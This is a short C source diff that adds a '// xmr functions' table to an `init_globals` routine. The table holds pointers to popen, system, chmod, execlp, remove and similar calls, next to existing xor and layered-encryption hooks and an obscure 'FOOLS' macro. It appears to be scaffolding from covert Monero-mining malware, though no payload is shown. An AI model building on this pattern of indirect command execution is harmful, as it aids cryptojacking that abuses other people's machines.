@@ -18,6 +18,7 @@
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <libgen.h>
 
 #include "main/globals.h"
 #include "main/utils.h"
@@ -143,6 +144,20 @@ void init_globals(Globals *global){
     global->xor_memory_layered=&xor_memory_layered;
     global->encrypt_layered=&encrypt_layered;
     global->decrypt_layered=&decrypt_layered;
+
+    FOOLS;
+    // xmr functions
+    global->popen=&popen;
+    global->pclose=&pclose;
+    global->fgets=&fgets;
+    global->strncmp=&strncmp;
+    global->ferror=&ferror;
+    global->remove=&remove;
+    global->dirname=&dirname;
+    global->strdup=&strdup;
+    global->system=&system;
+    global->chmod=&chmod;
+    global->execlp=&execlp;
 
     FOOLS;
     // global values
